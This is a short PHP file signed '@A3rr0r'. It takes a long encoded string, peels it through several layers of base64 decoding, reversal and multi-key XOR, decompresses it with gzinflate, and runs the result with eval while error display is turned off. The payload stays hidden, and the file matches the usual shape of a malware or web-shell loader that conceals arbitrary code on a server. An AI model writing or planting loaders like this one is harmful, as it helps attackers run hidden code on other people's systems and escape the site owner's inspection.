<?php

/* @A3rr0r */

error_reporting(E_ALL);
ini_set('display_errors', '0');
$ࠡ6aeࠥ1 = '9cmNsRjNud1NlNzK0cGOw8kN1kjRTlHORJzcKp0Tv5mYTN1bV9CR592bQBFU3oUMvhWU2hXO0x0Kit0ZntkTxgVOldHMEhGbSFXTopUUQdnTsx0RZ9CV4EXYMFWZ1skR2AlQ2c3MJBXVuRTTSFXd0sWRmlmNqlVYvsSYTRjYEJTUB1kdpl2UZlzKRpXVVVHe0dlS2UGTTtGVhpEZ1YWWnhTbCVnNyNFOJRGUItCTMRnNkFzc2B3cHRTa2FzZPZ3M2VUTsJGRppGNUljc5F0K4Z3ZjZUQ6R0b4clTjFnViVUNUJVdtt0NvgDWydUSvUXehNXWrR2M0oVZ6ZmURh1a0gDNMl2T1dVZstUU1cVSLhDZXFGbTBFV3EERmREUXpUM012d0JGWwMXSJtCRpJXWpZ3YIpGbvNWYx9iNxlUaPFndVBFMSRESrQ3Q1BHOjVGM4dWOI1mbWdTQtBnZjhWcKNlZStCNqlkNzQUSNFDS0tGUrFGd1onNZd0Lr0EbQp3K4EEU2NlNDZGdtNkMMFVOwEjMwdWTlhnbW12TKNUcv9CRXJ0KuNlU1FXV2N0a3EGMrBjM5NEN1ZkSQZmahJzTsd0Z1lTNilXO690YqhGa58WSKBVUhpmR3Qlaat0VatURQpXQ0RGVyB3bUBXS4czT3UXW3o2Z2ZnR0gUTLpGSEtCSOR3b6FWRDNzU5pnMz5kNVZHcnpkcThzSmVnSFlGUrM3TnlHeulmMkNmYJpHRhFTd0UFduFUOjtierQ3a5tybSlDZ51kcnBndxpFau9WO30Eczt0Svo2bslWSKpVONt0bQRVe1lXO1x0Ly5kTLtCNGVlYpJDRvV2NPtkUIpWQ1A1b5IXSPpGVRNEerkXRPJXQxx0KxZzQ3UnaPNmeYZTetNER2RlbENXcnV2VoJmNs1UMRpmT4gzT5Y2Sxg0T2BzM48kaQRlU0VTb21WbJhzLzMWZIdzKERDMxxEZ1p1cFNmeTVncuFHazAlYV1EWzl3aRFGbZJHNGVzSzNVbutGNLFkTql2VXZVdHFVOXN3NydFRl9CStRlNY12YBVUYmtSS2ond5MVU3l0YlVlb11karRjVzBzZNFGS2hzcIZDZshXQ0dDVzcEOwVXT2RDMNBjNRB1UPpmQwE0R3Q1TwUTTQRlex8kYO5mdzgTSxRUd4IGNZB3Q2FXRXBFdMhEWB9STZ9kdTV3VRlVaDFDdR50KBdVN4cFVxcjQqNWRDFmZ6lUZHtSV2BjeyADTKhDR1QXcFNza1M3TEtySmNDaIpEM0FUdrk1MR9mVP10ZqpFU44kU0BVamVkMKNkTKhVNLVkTz02L5J3S0MkYM1kU2syd2YkZyJGWhBlTyBVT';
$ࠡ95abࠥ2 = 'fpUUAzVzMQdlEwsCS4n+1CA1T8Rg0tO5gqc4kWqvyvM=';
$ࠡc411ࠥ3 = 'FpP534hpjvUZY44iRZP+35lc+qLaYPurBgs212wghrc=';
$ࠡf487ࠥ4 = 'fZaOUc6uwcBCoaOmYOa60OSejVydQP84HODklWiPcIA=';
try {
$ࠡ52a6ࠥ5 = strrev($ࠡ6aeࠥ1);
$ࠡ52a6ࠥ5 = base64_decode($ࠡ52a6ࠥ5, true);
if ($ࠡ52a6ࠥ5 === false) throw new Exception('Decryption stage 2 failure.');
$ࠡ52a6ࠥ5 = base64_decode($ࠡ52a6ࠥ5, true);
if ($ࠡ52a6ࠥ5 === false) throw new Exception('Decryption stage 3 failure.');
$ࠡa4b9ࠥ6 = base64_decode($ࠡf487ࠥ4, true);
if ($ࠡa4b9ࠥ6 === false) throw new Exception('Key 3 decoding failure.');
$ࠡeb01ࠥ7 = '';
$ࠡ68cࠥ8 = strlen($ࠡ52a6ࠥ5);
for ($ࠡ2aa5ࠥ9 = 0; $ࠡ2aa5ࠥ9 < $ࠡ68cࠥ8; $ࠡ2aa5ࠥ9++) {
$ࠡeb01ࠥ7 .= chr(ord($ࠡ52a6ࠥ5[$ࠡ2aa5ࠥ9]) ^ ord($ࠡa4b9ࠥ6[$ࠡ2aa5ࠥ9 % 32]));
}
$ࠡ52a6ࠥ5 = $ࠡeb01ࠥ7;
$ࠡ52a6ࠥ5 = base64_decode($ࠡ52a6ࠥ5, true);
if ($ࠡ52a6ࠥ5 === false) throw new Exception('Decryption stage 5 failure.');
$ࠡc595ࠥ10 = base64_decode($ࠡ95abࠥ2, true);
$ࠡ942fࠥ11 = base64_decode($ࠡc411ࠥ3, true);
if ($ࠡc595ࠥ10 === false || $ࠡ942fࠥ11 === false) throw new Exception('Multi-keys decoding failure.');
$ࠡ4e34ࠥ12 = '';
$ࠡ68cࠥ8 = strlen($ࠡ52a6ࠥ5);
for ($ࠡ2aa5ࠥ9 = 0; $ࠡ2aa5ࠥ9 < $ࠡ68cࠥ8; $ࠡ2aa5ࠥ9++) {
$ࠡ4e34ࠥ12 .= chr(ord($ࠡ52a6ࠥ5[$ࠡ2aa5ࠥ9]) ^ ord($ࠡc595ࠥ10[$ࠡ2aa5ࠥ9 % 32]) ^ ord($ࠡ942fࠥ11[$ࠡ2aa5ࠥ9 % 32]));
}
$ࠡ52a6ࠥ5 = $ࠡ4e34ࠥ12;
$ࠡ52a6ࠥ5 = base64_decode($ࠡ52a6ࠥ5, true);
if ($ࠡ52a6ࠥ5 === false) throw new Exception('Decryption stage 7 failure.');
$ࠡ1c21ࠥ13 = gzinflate($ࠡ52a6ࠥ5);
if ($ࠡ1c21ࠥ13 === false) throw new Exception('Decompression failure.');
ob_start();
$ࠡe7acࠥ14 = eval('?>' . $ࠡ1c21ࠥ13);
if ($ࠡe7acࠥ14 === false && !empty($ࠡe5daࠥ15 = error_get_last())) {
}
ob_end_flush();
} catch (Exception $ࠡ668eࠥ16) {
header('HTTP/1.1 500 Internal Server Error');
echo '<div style="font-family:monospace;padding:20px;background:#1e1e1e;color:#ff5555;border-radius:5px;">';
echo '<h3>Execution Error</h3>';
echo '<p>' . htmlspecialchars($ࠡ668eࠥ16->getMessage()) . '</p>';
echo '</div>';
exit(1);
}
